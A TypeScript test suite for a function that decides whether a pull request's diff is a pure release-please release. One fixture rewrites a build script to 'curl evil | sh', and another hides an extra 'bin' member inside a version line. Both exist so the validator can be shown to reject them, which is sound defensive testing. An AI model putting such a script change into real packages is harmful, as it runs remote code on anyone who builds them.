import fc from 'fast-check';
import { describe, expect, it } from 'vitest';

import { classifyReleaseDiff, isVersionOnlyPatch } from '../src/release-diff.js';
import { makeChangedFile, makeReleaseFiles, VERSION_BUMP_PATCH } from './fixtures.js';

// The release-only diff rule behind release-please eligibility (docs/bot-eligibility.md).

function packageJson(patch: string | undefined) {
  return makeChangedFile({ filename: 'package.json', patch });
}

describe('isVersionOnlyPatch', () => {
  it('accepts a patch that changes only the version line', () => {
    expect(isVersionOnlyPatch(VERSION_BUMP_PATCH)).toBe(true);
  });

  it('accepts a version line without a trailing comma', () => {
    expect(isVersionOnlyPatch('@@ -1 +1 @@\n-"version": "1.0.0"\n+"version": "1.1.0"')).toBe(true);
  });

  it('rejects a version bump that also adds a dependency', () => {
    const patch = `${VERSION_BUMP_PATCH}\n+    "left-pad": "1.3.0",`;

    expect(isVersionOnlyPatch(patch)).toBe(false);
  });

  it('rejects a version bump that also changes a script', () => {
    const patch = `${VERSION_BUMP_PATCH}\n-    "build": "tsup",\n+    "build": "curl evil | sh",`;

    expect(isVersionOnlyPatch(patch)).toBe(false);
  });

  it('rejects a patch that only removes the version', () => {
    expect(isVersionOnlyPatch('@@ -2 +1,0 @@\n-  "version": "1.0.0",')).toBe(false);
  });

  it('rejects a patch that adds a second version line', () => {
    const patch = `${VERSION_BUMP_PATCH}\n+  "version": "9.9.9",`;

    expect(isVersionOnlyPatch(patch)).toBe(false);
  });

  it('rejects a version value that smuggles in a second member', () => {
    const patch = '@@ -1 +1 @@\n-  "version": "1.0.0",\n+  "version": "1.1.0", "bin": "x",';

    expect(isVersionOnlyPatch(patch)).toBe(false);
  });

  it('ignores the no-newline marker', () => {
    const patch = `${VERSION_BUMP_PATCH}\n\\ No newline at end of file`;

    expect(isVersionOnlyPatch(patch)).toBe(true);
  });
});

describe('classifyReleaseDiff', () => {
  it('accepts a release-please release (manifest, CHANGELOG, version bump)', () => {
    expect(classifyReleaseDiff(makeReleaseFiles())).toEqual({ release: true });
  });

  it('accepts a first release that adds its CHANGELOG', () => {
    const files = [makeChangedFile({ filename: 'CHANGELOG.md', status: 'added' })];

    expect(classifyReleaseDiff(files)).toEqual({ release: true });
  });

  it('rejects an incomplete file list', () => {
    expect(classifyReleaseDiff(undefined)).toEqual({
      release: false,
      reason: 'changed files unavailable',
    });
  });

  it('rejects an empty diff', () => {
    expect(classifyReleaseDiff([])).toEqual({ release: false, reason: 'no changed files' });
  });

  it('rejects a source file', () => {
    const files = [...makeReleaseFiles(), makeChangedFile({ filename: 'src/index.ts' })];

    expect(classifyReleaseDiff(files)).toEqual({
      release: false,
      reason: 'src/index.ts is not a release file',
    });
  });

  it('rejects a manifest outside the repository root', () => {
    const files = [makeChangedFile({ filename: 'nested/.release-please-manifest.json' })];

    expect(classifyReleaseDiff(files).release).toBe(false);
  });

  it('rejects a lockfile, even one release-please might write', () => {
    const files = [makeChangedFile({ filename: 'package-lock.json', patch: VERSION_BUMP_PATCH })];

    expect(classifyReleaseDiff(files).release).toBe(false);
  });

  it('rejects a package.json that changes more than its version', () => {
    const files = [packageJson(`${VERSION_BUMP_PATCH}\n+  "private": false,`)];

    expect(classifyReleaseDiff(files)).toEqual({
      release: false,
      reason: 'package.json changes more than its version',
    });
  });

  it('rejects a package.json whose patch GitHub omitted', () => {
    expect(classifyReleaseDiff([packageJson(undefined)])).toEqual({
      release: false,
      reason: 'package.json has no patch to verify',
    });
  });

  it.each(['removed', 'renamed', 'copied', 'changed'])('rejects a %s release file', (status) => {
    const files = [makeChangedFile({ filename: 'CHANGELOG.md', status })];

    expect(classifyReleaseDiff(files)).toEqual({
      release: false,
      reason: `CHANGELOG.md was ${status}`,
    });
  });

  it('rejects a lookalike name', () => {
    const files = [makeChangedFile({ filename: 'docs/CHANGELOG.md.js' })];

    expect(classifyReleaseDiff(files).release).toBe(false);
  });

  it('never accepts a release with any non-release file added', () => {
    const nonRelease = fc
      .stringMatching(/^[a-z./]{1,20}$/)
      .filter(
        (path) =>
          path !== '.release-please-manifest.json' &&
          !path.endsWith('/CHANGELOG.md') &&
          path !== 'CHANGELOG.md' &&
          !path.endsWith('/package.json') &&
          path !== 'package.json',
      );
    fc.assert(
      fc.property(nonRelease, fc.nat({ max: 3 }), (filename, position) => {
        const files = makeReleaseFiles();
        files.splice(position, 0, makeChangedFile({ filename }));

        expect(classifyReleaseDiff(files).release).toBe(false);
      }),
    );
  });
});
